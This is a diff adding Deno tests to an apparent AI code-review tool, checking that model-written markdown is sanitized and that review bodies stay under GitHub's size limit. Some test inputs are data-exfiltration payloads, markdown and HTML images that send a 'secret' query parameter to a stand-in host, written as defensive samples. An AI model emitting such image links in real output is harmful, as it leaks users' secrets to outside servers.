@@ -26,6 +26,12 @@ Deno.test("renders prompt variables and appends repository instructions", () => 
   assertThrows(() => renderPrompt(["{{missing}}"], variables, noInstructions));
 });
 
+Deno.test("sanitizes markdown that reassembles after one pass", () => {
+  assertEquals(sanitizeMarkdown("!![x](https://e/?d=1)"), "[x](https://e/?d=1)");
+  assertEquals(sanitizeMarkdown("<im<img>g src=https://e/?d=2>"), "");
+  assertEquals(sanitizeMarkdown("&#64;octocat &#x40;octocat"), "@\u200boctocat @\u200boctocat");
+});
+
 Deno.test("sanitizes untrusted model markdown", () => {
   assertEquals(
     sanitizeMarkdown("see ![x](https://evil.test/?d=secret)"),
@@ -64,4 +70,27 @@ Deno.test("review body distinguishes proposed from enforced decisions", () => {
     authority: "advisory",
   });
   assertEquals(proposed.includes("**Proposed decision: Approve** (not enforced"), true);
+});
+
+Deno.test("caps the review body below GitHub's limit and keeps the footer", () => {
+  const long = "x".repeat(7_000);
+  const finding = {
+    path: "a.ts",
+    line: 1,
+    side: "RIGHT" as const,
+    severity: "low" as const,
+    title: "t",
+    body: long,
+  };
+  const body = reviewBody({
+    run: { harness: "claude", requester: "m", runUrl: "https://x", headSha: "a".repeat(40) },
+    result: { outcome: "completed", summary: long, coverage: long, limitations: [], findings: [] },
+    verdict: { kind: "comment", reasons: [] },
+    event: "COMMENT",
+    authority: "advisory",
+    unanchored: Array(30).fill(finding),
+    notes: [],
+  });
+  assertEquals(body.length < 65_536, true);
+  assertEquals(body.endsWith("[Run](https://x)"), true);
 });
